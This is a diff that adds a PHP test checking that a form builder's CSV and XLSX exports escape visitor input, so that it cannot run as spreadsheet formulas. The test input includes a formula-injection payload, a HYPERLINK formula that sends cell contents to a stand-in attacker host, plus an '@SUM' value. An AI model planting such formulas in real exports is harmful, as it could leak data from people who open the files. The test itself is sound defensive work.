@@ -166,3 +166,28 @@ it('refuses a redirect URL that would run script', function (): void {
         ->call('save')
         ->assertHasNoFormErrors();
 });
+
+it('exports what a visitor typed as text, never as a formula', function (): void {
+    $form = contactForm();
+    app(Submitter::class)->submit($form, contactInput($form, ['name' => '=HYPERLINK("http://evil.test?"&A1,"x")', 'message' => '@SUM(1+1)']));
+
+    $handle = fopen('php://memory', 'w+');
+    SubmissionsExport::write($form, $form->submissions()->getQuery(), $handle);
+    rewind($handle);
+    $rows = array_map('str_getcsv', array_filter(explode("\n", stream_get_contents($handle))));
+
+    expect($rows[1][3])->toBe('\'=HYPERLINK("http://evil.test?"&A1,"x")')
+        ->and($rows[1][6])->toBe("'@SUM(1+1)")
+        ->and(SubmissionsExport::csvCell('-5'))->toBe('-5')
+        ->and(SubmissionsExport::csvCell('-1+1'))->toBe("'-1+1");
+
+    $path = tempnam(sys_get_temp_dir(), 'fb').'.xlsx';
+    SubmissionsExport::writeXlsx($form, $form->submissions()->getQuery(), $path);
+    $zip = new ZipArchive;
+    $zip->open($path);
+    $sheet = (string) $zip->getFromName('xl/worksheets/sheet1.xml');
+    $zip->close();
+    unlink($path);
+
+    expect($sheet)->not->toContain('<f>');
+});
